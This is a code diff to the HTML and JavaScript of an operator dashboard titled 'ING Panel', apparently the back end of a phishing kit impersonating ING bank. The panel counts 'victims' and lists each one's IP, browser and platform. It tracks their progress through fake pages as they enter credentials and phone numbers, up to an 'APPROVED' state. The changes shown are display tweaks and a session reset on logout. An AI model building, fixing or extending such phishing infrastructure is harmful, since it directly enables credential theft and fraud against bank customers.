@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>$$$</title>
+  <title>ING Panel</title>
   <link rel="preconnect" href="https://rsms.me">
   <link rel="stylesheet" href="https://rsms.me/inter/inter.css">
   <style>
@@ -172,10 +172,10 @@
       setTimeout(() => alert.remove(), 5000);
     }
 
-    /* ----------  STATUS TEXT - FIXED  ---------- */
+    /* ----------  STATUS TEXT - FIXED: Only show APPROVED once  ---------- */
     function statusText(s){
-      // Just show APPROVED for approved sessions
-      if (s.page==='success' || s.status==='approved') return '<div style="color:var(--green)">APPROVED</div>';
+      // For approved sessions, return empty - the pageTitle shows APPROVED
+      if (s.page==='success' || s.status==='approved') return '';
       if (s.page==='index.html' && s.entered) return '<div style="font-size:11px;color:var(--green)">ENTERED CREDENTIALS</div>';
       if (s.page==='verify.html' && s.phone) return '<div style="font-size:11px;color:var(--blue)">ENTERED PHONE</div>';
       if (s.page==='unregister.html' && s.unregisterClicked) return '<div style="font-size:11px;color:var(--yellow)">CLICKED UNREGISTER</div>';
@@ -242,7 +242,6 @@
 
     /* ----------  RENDER  ---------- */
     function pageTitle(f){
-      // Just show APPROVED for success page
       if (f === 'success') return 'APPROVED';
       switch(f){
         case 'index.html': return 'LOGIN';
@@ -253,7 +252,6 @@
       }
     }
     
-    // Check if session is approved
     function isApproved(s) {
       return s.page === 'success' || s.status === 'approved';
     }
@@ -261,22 +259,16 @@
     function render(d){
       qs('#userName').textContent = d.username;
       qs('#total').textContent    = d.totalVictims;
-      
-      // FIXED: Just show the success count from server, don't add extra
-      qs('#success').textContent = d.success;
-      
+      qs('#success').textContent  = d.success;
       qs('#domainLink').textContent = d.domain || 'localhost';
       qs('#domainLink').href        = d.domain || 'http://localhost';
 
-      // Filter out approved sessions from active count
       const activeSessions = d.sessions.filter(s => !isApproved(s));
-      
       qs('#active').textContent = activeSessions.length;
 
       const body = qs('#tbl tbody');
       const empty= qs('#empty');
       
-      // Show all sessions including approved, but style approved differently
       if(!d.sessions.length){ body.innerHTML=''; empty.style.display='block'; return; }
       empty.style.display='none';
       
@@ -292,7 +284,7 @@
           <td><a class="ip-link" onclick="openIpLookup('${s.ip}')" title="Lookup IP">${s.ip}</a></td>
           <td>${s.platform}</td>
           <td>${s.browser}</td>
-          <td><div style="font-weight:600">${pageTitle(s.page)}</div>${statusText(s)}</td>
+          <td><div style="font-weight:600;color:${approved?'var(--green)':''}">${pageTitle(s.page)}</div>${statusText(s)}</td>
           <td>${actionButtons(s)}</td>
         </tr>`;
       }).join('');
@@ -300,7 +292,6 @@
 
     /* ----------  IP LOOKUP  ---------- */
     function openIpLookup(ip) {
-      // Extract IP without port if present
       const cleanIp = ip.split(':')[0];
       window.open(`https://db-ip.com/${cleanIp}`, '_blank');
     }
@@ -417,6 +408,8 @@
 
     /* ----------  LOGOUT + EXPORT  ---------- */
     qs('#logoutBtn').onclick = async () => {
+      // Clear lastSessions on logout so next login starts fresh
+      lastSessions.clear();
       await fetch('/panel/logout',{method:'POST'});
       location.replace('/panel');
     };
